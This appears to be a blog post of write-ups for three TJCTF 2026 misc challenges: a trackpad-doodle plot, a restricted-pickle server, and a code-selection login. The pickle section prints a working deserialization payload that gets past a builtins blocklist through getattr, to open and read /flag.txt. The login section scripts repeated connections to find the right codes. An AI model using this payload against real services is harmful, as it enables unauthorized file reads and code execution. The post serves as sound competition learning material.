---
layout: post
title:  "Misc Challenges"
date:   2026-05-17 20:54:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /TJCTF-2026-misc/
---
* TOC
{:toc}

## delta-doodle

**Author**: andrew

**Category**: misc

**Description**: i was calibrating the new AR airbrush for our maker faire booth by doodling the flag in midair. the headset, unfortunately, only logged the raw data. can you accumulate the motion trail and figure out what message we were trying to spray-paint?

I get the challenge file:
```shell
cat trackpad_deltas.csv | wc -l  
783  

cat trackpad_deltas.csv | head  
time_ms,dx,dy,pen_down  
40,2.500,15.008,0  
56,0.000,-2.485,1  
72,2.960,0.000,1  
88,0.000,-1.117,1  
104,-2.960,0.000,1  
120,0.000,-4.750,1  
136,0.073,-0.879,1  
152,0.219,-0.496,1  
168,0.444,-0.229,1  

cat trackpad_deltas.csv | tail  
12992,-0.026,-0.545,1  
13008,0.000,-1.867,1  
13024,-0.041,-0.791,1  
13040,-0.326,-1.151,1  
13056,-0.285,-0.360,1  
13072,-0.407,-0.254,1  
13088,-1.299,-0.290,1  
13104,-0.892,-0.036,1  
13120,-0.493,0.000,1  
13136,0.000,1.125,1
```

The numbers correspond to: `time_ms,dx,dy,pen_down`

Solve script:
```python
import csv
import matplotlib.pyplot as plt

x, y = 0, 0
xs, ys = [], []

with open("trackpad_deltas.csv") as f:
    reader = csv.DictReader(f)

    for row in reader:
        dx, dy = float(row["dx"]), float(row["dy"])
        pen = int(row["pen_down"])

        x += dx
        y += dy

        if pen:
            xs.append(x)
            ys.append(y)
        else:
            xs.append(None)
            ys.append(None)

plt.plot(xs, ys, linewidth=1)
plt.gca().set_aspect("equal")
plt.axis("off")
plt.show()
```

Output:

![Alt text](/images/delta-doodle.png)

`tjctf{sum_the_deltas}`

___

## mind blowers

**Author**: zain

**Category**: misc

**Description**: Rick has open sourced his mind blowers program! Now you can upload your own mind blowers and view them! Don't upload any malicious mind blowers! `nc tjc.tf 31422`

Source code for the server:
```python
#!/usr/local/bin/python
import pickle
import socket
import threading
import io
import base64


BLOCKED_NAMES = {
    "eval", "exec", "compile", "__import__", "open",
    "breakpoint", "input", "exit", "quit",
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module != "builtins":
            raise pickle.UnpicklingError("banned")
        if name in BLOCKED_NAMES:
            raise pickle.UnpicklingError("blocked")
        return super().find_class(module, name)


def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()


def handle_connection(conn):
    try:
        conn.sendall(b"=== Rick's Mind Blower Server v3 ===\n")
        conn.sendall(b"Only safe memories allowed now!!!!\n")
        conn.sendall(b"Upload a memory (base64 encoded) > ")

        data = conn.recv(8192).strip()
        if not data:
            return

        try:
            raw = base64.b64decode(data)
        except Exception:
            conn.sendall(b"thats not base64\n")
            return

        result = safe_loads(raw)
        conn.sendall(f"Here is your memory: {result}\n".encode())

    except pickle.UnpicklingError as e:
        conn.sendall(f"blocked: {e}\n".encode())
    except Exception as e:
        conn.sendall(f"error: {e}\n".encode())
    finally:
        conn.close()


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 5000))
    server.listen(5)
    print("Mind Blower Server v3 on port 5000")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_connection, args=(conn,))
        thread.daemon = True
        thread.start()


if __name__ == "__main__":
    main()
```

The server provides a python pickle deserialization service that restricts imports to the `builtins` module. They also have a blocklist:
```python
BLOCKED_NAMES = {
    "eval", "exec", "compile", "__import__", "open",
    "breakpoint", "input", "exit", "quit",
}
```

Restriction is only on direct attribute access during unpickling. I need to make a payload that:
- calls `globals()` to get the current global dictionary
- uses `getattr` on that dictionary to retrieve  `'__builtins__'` (not in the block list)
- uses `getattr` on `__builtins__` to retrieve `'open'` (bypassing the block since `open` is retrieved via `getattr`)
- calls `open('/flag.txt')`, then `read()`

I run this python to generate a malicious base64 string to read the flag file:
```shell
python3  
Python 3.13.5 (main, Apr  6 2026, 12:24:14) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import base64  
...  
... opcodes = [  
...     b"cbuiltins\nglobals\n(tR",  # call globals  
...     b"p0\n",                     # put dict in memo 0  
...     b"cbuiltins\ngetattr\n",     # push getattr  
...     b"(g0\nS'__getitem__'\ntR",  # call getattr(dict, '__getitem__')  
...     b"(S'__builtins__'\ntR",     # call bound method with '__builtins__'  
...     b"p1\n",                     # put builtins in memo 1  
...     b"cbuiltins\ngetattr\n",     # push getattr  
...     b"(g1\nS'open'\ntR",         # call getattr(builtins, 'open')  
...     b"(S'/flag.txt'\ntR",        # call open('flag.txt')  
...     b"p2\n",                     # put file object in memo 2  
...     b"cbuiltins\ngetattr\n",     # push getattr  
...     b"(g2\nS'read'\ntR",         # call getattr(file, 'read')  
...     b"(tR",                      # call read()  
...     b".\n"                       # stop  
... ]  
...  
... payload = b''.join(opcodes)  
... print(base64.b64encode(payload))  
...  
b'Y2J1aWx0aW5zCmdsb2JhbHMKKHRScDAKY2J1aWx0aW5zCmdldGF0dHIKKGcwClMnX19nZXRpdGVtX18nCnRSKFMnX19idWlsdGluc19fJwp0UnAxCmNidWlsdGlucwpnZXRhdHRyCihnMQpTJ29wZW4nCnRSKFMnL2ZsYWcudHh0Jwp0UnAyCmNidWlsdGlucwpnZXRhdHRyCihnMgpTJ3JlYWQnCnRSKHRSLgo='  
>>> exit
```

Connecting to the server:
```shell
nc tjc.tf 31422  
=== Rick's Mind Blower Server v3 ===  
Only safe memories allowed now!!!!  
Upload a memory (base64 encoded) > Y2J1aWx0aW5zCmdsb2JhbHMKKHRScDAKY2J1aWx0aW5zCmdldGF0dHIKKGcwClMnX19nZXRpdGVtX18nCnRSKFMnX19idWlsdGluc19fJwp0UnAxCmNidWlsdGlucwpnZXRhdHRyCihnMQpTJ29wZW4nCnRSKFMnL2ZsYWcudHh0Jwp0UnAyCmNidWlsdGlucwpnZXRhdHRyCihnMgpTJ3JlYWQnCnRSKHRSLgo=  
Here is your memory: tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}
```

`tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}`

___

## find-da-code

**Author**: ashwathg

**Category**: misc

**Description**: You were assigned 4 unique codes to remember a year ago, but you forgot them! Now you need to figure out a way to get in...

P.S. This challenge was inspired by a particular authentication system I had to bypass because I forgot my pictures lol

`nc tjc.tf 31004`

Connecting to the server:
```shell
nc tjc.tf 31004  
=== SECURE TERMINAL LOGIN ===  
  
Stage 1  
1. 0xC29F  
2. 0xFF15  
3. 0xDEB3  
4. 0x3B72  
5. 0x3BFF  
6. 0x88D1  
7. 0x1B81  
8. 0xBDC9  
9. 0x4D23  
10. 0x0D66  
Enter choice for stage 1 (1-10): 1  
  
Stage 2  
1. 0xECBA  
2. 0x5509  
3. 0xED77  
4. 0x4259  
5. 0xF995  
6. 0xC192  
7. 0xE49D  
8. 0x9908  
9. 0x1A2B  
10. 0x2C3E  
Enter choice for stage 2 (1-10): 2  
  
Stage 3  
1. 0x265E  
2. 0x64DF  
3. 0xF6D7  
4. 0xB516  
5. 0xCFCF  
6. 0xFCF9  
7. 0x9C4F  
8. 0xD72D  
9. 0xB326  
10. 0xCD75  
Enter choice for stage 3 (1-10): 3  
  
Stage 4  
1. 0xC5C2  
2. 0xE6A6  
3. 0x750E  
4. 0xA158  
5. 0xA717  
6. 0xB0D7  
7. 0x1965  
8. 0x00FA  
9. 0x37CB  
10. 0x779B  
Enter choice for stage 4 (1-10): 4  
ERROR: Invalid Authentication Sequence. Connection terminated.  
^C
```

I run this to do frequency analysis on the 4 most common tokens:
```python
from collections import Counter
from pwn import *
import re

HOST = "tjc.tf"
PORT = 31004

def get_hex_tokens_from_one_run():
    io = remote(HOST, PORT)
    data = io.recvuntil(b"): ")
    io.close()
    text = data.decode()
    return re.findall(r"0x[0-9A-Fa-f]{4}", text)

all_tokens = []
NUM_SAMPLES = 20

for _ in range(NUM_SAMPLES):
    tokens = get_hex_tokens_from_one_run()
    all_tokens.extend(tokens)

counts = Counter(all_tokens)
print("4 most common hex tokens:")
for token, freq in counts.most_common(4):
    print(f"  {token}: {freq} times")
```

Output:
```shell
python3 solve10.py  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
[+] Opening connection to tjc.tf on port 31004: Done  
[*] Closed connection to tjc.tf port 31004  
4 most common hex tokens:  
0x88D1: 7 times  
0x9C4F: 6 times  
0x1A2B: 4 times  
0x00FA: 3 times
```

Now I have the 4 codes: `0x88D1, 0x1A2B, 0x9C4F, 0x00FA`

I run this python to authenticate to the server:
```python
from pwn import *
import re

io = remote("tjc.tf", 31004)

GOOD_CODES = {"0x88D1", "0x1A2B", "0x9C4F", "0x00FA"}

# loop 4 times for the 4 stages
for stage in range(1, 5):
    print(f"Stage {stage}")
    
    # read until the prompt
    data = io.recvuntil(b"): ")
    data_str = data.decode()
    print(data_str, end="") 

    # search for which code is present in the current options
    found = False
    for item in GOOD_CODES:
        match = re.search(rf"(\d+)\.\s+{item}", data_str)
        if match:
            choice = match.group(1)
            io.sendline(choice.encode())
            print(f" > Sent Choice: {choice}\n")
            found = True
            break
            
    if not found:
        print("\nError: No code found ;(")
        sys.exit(1)

# read everything left in the buffer
print(io.recvall().decode())
```

Output:
```shell
python3 solve10.py  
[+] Opening connection to tjc.tf on port 31004: Done  
Stage 1  
=== SECURE TERMINAL LOGIN ===  
  
Stage 1  
1. 0x9C4F  
2. 0x62D0  
3. 0x9253  
4. 0x781E  
5. 0x6998  
6. 0x0E44  
7. 0xB873  
8. 0x42BD  
9. 0xC9D8  
10. 0x83FA  
Enter choice for stage 1 (1-10):  > Sent Choice: 1  
  
Stage 2  
  
Stage 2  
1. 0xC582  
2. 0xD1A8  
3. 0xF29F  
4. 0x94A3  
5. 0x00FA  
6. 0x298A  
7. 0xE5D1  
8. 0xCCDB  
9. 0x35FE  
10. 0x11E6  
Enter choice for stage 2 (1-10):  > Sent Choice: 5  
  
Stage 3  
  
Stage 3  
1. 0xDE6E  
2. 0x757B  
3. 0x3E5F  
4. 0xF735  
5. 0x4709  
6. 0x04AC  
7. 0x70E9  
8. 0x5CFE  
9. 0x8EFA  
10. 0x88D1  
Enter choice for stage 3 (1-10):  > Sent Choice: 10  
  
Stage 4  
  
Stage 4  
1. 0x1A2B  
2. 0xBF32  
3. 0x796C  
4. 0xD745  
5. 0xAB0E  
6. 0xD0C2  
7. 0xFE49  
8. 0x604F  
9. 0xA6A0  
10. 0x9FDA  
Enter choice for stage 4 (1-10):  > Sent Choice: 1  
  
[+] Receiving all data: Done (48B)  
[*] Closed connection to tjc.tf port 31004  
ACCESS GRANTED.  
tjctf{brut3_f0rc3_th3_t3rm1n4l}
```

`tjctf{brut3_f0rc3_th3_t3rm1n4l}`
